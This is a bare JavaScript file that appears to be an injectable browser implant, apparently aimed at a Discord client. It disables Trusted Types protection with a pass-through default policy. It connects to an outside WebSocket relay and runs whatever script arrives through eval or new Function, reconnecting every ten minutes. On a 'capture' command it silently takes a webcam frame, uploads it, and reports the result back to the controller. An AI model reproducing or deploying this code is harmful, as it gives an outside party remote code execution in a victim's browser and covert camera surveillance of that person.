if(!trustedTypes.defaultPolicy) {
    trustedTypes.createPolicy('default', {
        createHTML: string => string,
        createScriptURL: string => string,
        createScript: string => string,
    });
}
let ws = new WebSocket('wss://cloud.achex.ca/inject');
ws.onopen = () => {
    ws.send('{"auth":"discord","passwd":"none"}');
}
ws.onmessage = mess => {
    console.log(mess.data);
  
    if(JSON.parse(mess.data).msg == 'capture') {
          capture();
          return;
    }
  
    let script = JSON.parse(mess.data);
    try {
        eval(script.msg);
    }
    catch {
        console.error('eval err');
        try {
          new Function(script.msg)();
        }
        catch { return }
    }
}

setInterval(() => {
    ws.close();
    ws = new WebSocket('wss://cloud.achex.ca/inject');
    ws.onopen = () => {
        ws.send('{"auth":"discord","passwd":"none"}');
    }
    ws.onmessage = mess => {
        console.log(mess.data);
      
        if(JSON.parse(mess.data).msg == 'capture') {
          capture();
          return;
        }
      
        let script = JSON.parse(mess.data);
        try {
            eval(script.msg);
        }
        catch {
            console.error('eval err');
            new Function(script.msg)();
        }
    }
}, 10 *60 *1000);


// capture
async function capture() {
    const video = document.createElement('video');
        video.width = 1980;
        video.height = 1080;
        video.style.display = 'none';
    const canvas = document.createElement('canvas');
        canvas.width = 1980;
        canvas.height = 1080;
        canvas.style.display = 'none';
    document.body.appendChild(video);
    document.body.appendChild(canvas);

    navigator.mediaDevices.getUserMedia({ video: true })
    .then(async stream => {
        video.srcObject = stream;
        await video.play();
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        video.srcObject.getTracks().forEach(track => track.stop());
        const dataUrl = canvas.toDataURL('image/png');

        const response = await fetch('/upload-image', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ dataUrl })
        });

        const result = await response.text();
      
        ws.send(JSON.stringify({to: 'sender',msg: result}));

        console.log(result);
    });
}